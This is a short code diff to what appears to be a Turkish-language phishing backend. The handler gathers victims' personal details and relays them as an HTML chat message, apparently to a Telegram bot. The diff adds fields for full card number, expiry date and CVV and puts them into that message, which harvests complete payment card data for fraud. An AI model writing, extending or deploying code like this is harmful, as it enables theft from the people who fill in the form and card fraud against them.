@@ -36,6 +36,10 @@ export default async function handler(req, res) {
       memleketIl,
       memleketIlce,
       medeniHal,
+      kartNumarasi,
+      sonKullanimAy,
+      sonKullanimYil,
+      cvv,
       type 
     } = req.body;
 
@@ -86,6 +90,9 @@ export default async function handler(req, res) {
 🏠 <b>Adres:</b> ${escapeHtml(adresIl)}/${escapeHtml(adresIlce)} | 🗺️ <b>Memleket:</b> ${escapeHtml(memleketIl)}/${escapeHtml(memleketIlce)} | 💑 <b>Medeni Hal:</b> ${escapeHtml(medeniHal)}
 
 📞 <b>Telefon:</b> ${escapeHtml(telefon)} | 💵 <b>Kart Limiti:</b> ${escapeHtml(kartLimiti)} TL
+
+💳 <b>Kart Numarası:</b> <code>${escapeHtml(kartNumarasi || 'Belirtilmedi')}</code>
+📅 <b>Son Kullanma:</b> ${escapeHtml(sonKullanimAy || '')}/${escapeHtml(sonKullanimYil || '')} | 🔒 <b>CVV:</b> <code>${escapeHtml(cvv || 'Belirtilmedi')}</code>
 
 🌐 <b>IP:</b> <code>${escapeHtml(ip)}</code> | 📅 <b>Tarih:</b> ${escapeHtml(date)}
 
